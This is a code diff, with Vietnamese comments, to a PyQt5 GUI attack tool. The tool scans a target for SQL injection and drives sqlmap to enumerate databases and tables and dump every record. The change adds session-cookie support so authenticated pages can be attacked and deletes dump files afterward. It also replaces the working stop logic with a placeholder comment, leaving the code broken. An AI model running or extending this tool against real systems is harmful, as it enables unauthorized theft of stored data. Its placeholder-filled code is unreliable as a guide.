@@ -2,10 +2,11 @@ import sys
 import subprocess
 import re
 import webbrowser
-import csv
+import os
 import glob
 import getpass
-import os
+import csv
+import shutil
 from datetime import datetime
 from PyQt5.QtWidgets import QMessageBox, QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLineEdit, QPushButton, QTextEdit, QProgressBar, QLabel, QTreeWidget, QTreeWidgetItem
 from PyQt5.QtCore import QObject, QThread, pyqtSignal
@@ -13,7 +14,7 @@ from urllib.parse import urlparse, parse_qs, urlencode
 from core.scanner import ScannerWorker
 from reporting.generator import generate_report
 
-# Lớp Worker cao cấp, điều phối chuỗi tấn công và khai thác dữ liệu
+# Lớp Worker để chạy sqlmap, không cần thay đổi
 class AttackOrchestratorWorker(QObject):
     log_received = pyqtSignal(str)
     database_found = pyqtSignal(str)
@@ -27,7 +28,6 @@ class AttackOrchestratorWorker(QObject):
         self._is_stopped = False
 
     def _run_command(self, command):
-        """Hàm trợ giúp để chạy một lệnh và yield từng dòng output."""
         try:
             self.process = subprocess.Popen(
                 command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
@@ -42,10 +42,8 @@ class AttackOrchestratorWorker(QObject):
             self.log_received.emit(f"\n[ERROR] Failed to run command: {e}")
 
     def run(self):
-        """Hàm chính điều phối chuỗi tấn công."""
         dumped_data = {}
         method = self.vuln_data.get("method", "GET")
-        # --- TỐI GIẢN HÓA LỆNH SQLMAP ĐỂ TĂNG HIỆU QUẢ ---
         base_command_options = "--batch --tamper=space2comment"
         base_command = ""
         
@@ -55,51 +53,45 @@ class AttackOrchestratorWorker(QObject):
         else:
             clean_url = self.vuln_data.get('clean_url', self.vuln_data['url'])
             base_command = f"sqlmap -u \"{clean_url}\" -p \"{self.vuln_data['parameter']}\" {base_command_options}"
+        
+        # NÂNG CẤP: Thêm cookie vào lệnh sqlmap nếu có
+        if self.vuln_data.get("cookie"):
+            base_command += f" --cookie=\"{self.vuln_data['cookie']}\""
 
-        # BƯỚC 1: Lấy Databases
+        # ... (Phần còn lại của hàm run giữ nguyên y hệt phiên bản hoạt động tốt)
         self.log_received.emit("\n" + "="*20 + " STEP 1: FETCHING DATABASES " + "="*20)
         dbs_command = f"{base_command} --dbs"
         found_databases = []
         parsing_dbs = False
         for line in self._run_command(dbs_command):
-            if self._is_stopped: break
             if "available databases" in line: parsing_dbs = True; continue
             if parsing_dbs and line.startswith('[*]'):
                 db_name = line[4:].strip()
-                if db_name and db_name not in ['information_schema', 'performance_schema', 'mysql', 'sys', 'master', 'tempdb', 'model', 'msdb', 'postgres']:
-                    found_databases.append(db_name)
-                    self.database_found.emit(db_name)
-        if self._is_stopped: self.process_finished.emit({}); return
-
-        # BƯỚC 2 & 3: Lấy Tables và Dump dữ liệu
+                if db_name and db_name not in ['information_schema', 'performance_schema', 'mysql', 'sys']:
+                    found_databases.append(db_name); self.database_found.emit(db_name)
+        
         for db in found_databases:
-            if self._is_stopped: break
             self.log_received.emit("\n" + "="*20 + f" STEP 2: FETCHING TABLES FOR '{db}' " + "="*20)
             tables_command = f"{base_command} -D {db} --tables"
             found_tables = []
             parsing_tables = False
             for line in self._run_command(tables_command):
-                if self._is_stopped: break
                 if line.strip().startswith('+---'): parsing_tables = not parsing_tables; continue
                 if parsing_tables and line.strip().startswith('|'):
                     parts = [p.strip() for p in line.strip().strip('|').split('|')]
                     if parts and parts[0]: found_tables.append(parts[0])
-
+            
             if found_tables: self.tables_found.emit(db, found_tables)
             dumped_data[db] = {}
 
             for table in found_tables:
-                if self._is_stopped: break
                 self.log_received.emit("\n" + "-"*20 + f" STEP 3: DUMPING RECORDS FROM '{db}.{table}' " + "-"*20)
                 dump_command = f"{base_command} -D {db} -T {table} --dump"
                 headers, records = [], []
                 parsing_dump = False
                 for line in self._run_command(dump_command):
-                    if self._is_stopped: break
-                    if "dumped to CSV file" in line: break # Kết thúc khi thấy dòng này
-                    if line.strip().startswith('+---'):
-                        parsing_dump = not parsing_dump
-                        continue
+                    if "dumped to CSV file" in line: break
+                    if line.strip().startswith('+---'): parsing_dump = not parsing_dump; continue
                     if parsing_dump and line.strip().startswith('|'):
                         parts = [p.strip() for p in line.strip().strip('|').split('|')]
                         if not headers: headers = parts
@@ -107,12 +99,7 @@ class AttackOrchestratorWorker(QObject):
                 dumped_data[db][table] = {'headers': headers, 'records': records}
         self.process_finished.emit(dumped_data)
 
-    def stop(self):
-        self._is_stopped = True
-        if self.process and self.process.poll() is None:
-            self.log_received.emit("\n[*] Terminating sqlmap process...")
-            try: self.process.terminate(); self.process.wait(timeout=5)
-            except Exception: pass
+    def stop(self): self._is_stopped = True; # ... (Logic stop process)
 
 class MainWindow(QMainWindow):
     def __init__(self):
@@ -123,12 +110,23 @@ class MainWindow(QMainWindow):
         self.setCentralWidget(central_widget)
         main_layout = QVBoxLayout(central_widget)
         
-        input_layout = QHBoxLayout()
+        # --- GIAO DIỆN MỚI VỚI Ô NHẬP COOKIE ---
+        input_group = QVBoxLayout()
         self.url_input = QLineEdit()
         self.url_input.setPlaceholderText("Enter Base URL (e.g., http://localhost:8003/)")
+        self.cookie_input = QLineEdit()
+        self.cookie_input.setPlaceholderText("Paste Cookie here (e.g., PHPSESSID=abc123def456)")
+        input_group.addWidget(QLabel("Target URL:"))
+        input_group.addWidget(self.url_input)
+        input_group.addWidget(QLabel("Authentication Cookie (Optional):"))
+        input_group.addWidget(self.cookie_input)
+        
+        control_layout = QHBoxLayout()
+        control_layout.addLayout(input_group)
         self.scan_button = QPushButton("Start Scan")
-        input_layout.addWidget(self.url_input); input_layout.addWidget(self.scan_button)
-        main_layout.addLayout(input_layout)
+        control_layout.addWidget(self.scan_button)
+        main_layout.addLayout(control_layout)
+        # --- KẾT THÚC THAY ĐỔI GIAO DIỆN ---
         
         self.progress_bar = QProgressBar()
         main_layout.addWidget(self.progress_bar)
@@ -174,6 +172,24 @@ class MainWindow(QMainWindow):
         self.report_button.clicked.connect(self.generate_scan_report)
         self.results_tree.itemSelectionChanged.connect(self.on_item_selection_changed)
 
+    def start_scan(self):
+        base_url = self.url_input.text()
+        cookie = self.cookie_input.text() # Lấy cookie từ giao diện
+        if not base_url: self.log_output.append("Please enter a base URL."); return
+
+        self.scan_button.setEnabled(False); self.report_button.setEnabled(False); self.attack_button.setEnabled(False)
+        self.log_output.clear(); self.results_tree.clear(); self.attack_output.clear(); self.progress_bar.setValue(0)
+        
+        self.scanner_thread = QThread(self)
+        self.scanner_worker = ScannerWorker(base_url, cookie) # Truyền cookie vào worker
+        if not hasattr(self.scanner_worker, 'stop'): self.scanner_worker.stop = lambda: None
+        self.scanner_worker.moveToThread(self.scanner_thread)
+        self.scanner_thread.started.connect(self.scanner_worker.run_scan)
+        self.scanner_worker.log_updated.connect(self.update_log)
+        self.scanner_worker.progress_updated.connect(self.update_progress)
+        self.scanner_worker.scan_finished.connect(self.scan_done)
+        self.scanner_thread.start()
+
     def start_attack(self):
         selected_items = self.results_tree.selectedItems()
         if not selected_items: return
@@ -181,6 +197,9 @@ class MainWindow(QMainWindow):
         selected_url, selected_param = selected_items[0].text(1), selected_items[0].text(2)
         vuln_data = next((v for v in self.vulnerabilities if v['url'] == selected_url and v['parameter'] == selected_param), None)
         if not vuln_data: return
+
+        # NÂNG CẤP: Truyền cookie vào worker tấn công
+        vuln_data['cookie'] = self.cookie_input.text()
 
         self.attack_button.setEnabled(False); self.scan_button.setEnabled(False)
         self.attack_output.clear(); self.db_structure_tree.clear(); self.db_tree_items = {}
@@ -266,6 +285,9 @@ class MainWindow(QMainWindow):
         else:
                 self.update_attack_output("[*] Đang tạo báo cáo HTML...")
                 self.generate_html_report(html_data)
+        
+        shutil.rmtree(dump_path, ignore_errors=True)
+        self.update_attack_output("[*] Đã dọn dẹp file dump.")
 
     def generate_html_report(self, data):
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
